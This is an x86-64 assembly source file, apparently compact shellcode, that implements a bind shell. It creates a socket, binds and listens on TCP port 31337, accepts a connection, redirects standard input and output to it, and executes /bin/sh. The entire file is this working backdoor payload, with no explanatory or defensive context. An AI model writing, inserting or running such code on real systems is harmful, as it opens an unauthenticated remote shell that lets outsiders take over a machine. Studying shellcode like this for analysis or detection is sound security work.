global _start
section .text

_start:
	; socket
	xor rdi, rdi
	xor rsi, rsi
	mul rsi		; clear rax and rdx

	add rdi, 0x2

	add rsi, 0x1

	add rdx, 0x6

	add rax, 0x29
	syscall		; exec socket syscall

	mov r8, rax	; return value

	; bind
	xor r10, r10
	push r10

	mov byte [rsp], 0x2

	mov word [rsp + 0x2], 0x697a	; port 31337

	mov rsi, rsp

	push r8
	pop rdi

	push 0x10
	pop rdx

	push 0x31
	pop rax

	syscall		; exec bind syscall

	; listen
	push r8
	pop rdi

	push 0x32
	pop rax

	syscall		; exec listen syscall

	; accept
	push r8
	pop rdi

	xor rsi, rsi
	mov rdx, rsi

	push 0x2b
	pop rax

	syscall		; exec accept syscall

	mov rdi, rax	; return value of accept

	; dup2
	push 0x3
	pop rsi

doop:
	dec rsi

	push 0x21
	pop rax

	syscall		; exec dup2 syscall

	jne doop

	; execve
	xor rsi, rsi
	push rsi

	mov rdi, 0x68732f6e69622f2f
	shr rdi, 0x8

	push rdi
	push rsp
	pop rdi

	push 0x3b
	pop rax

	syscall		; exec execve syscall
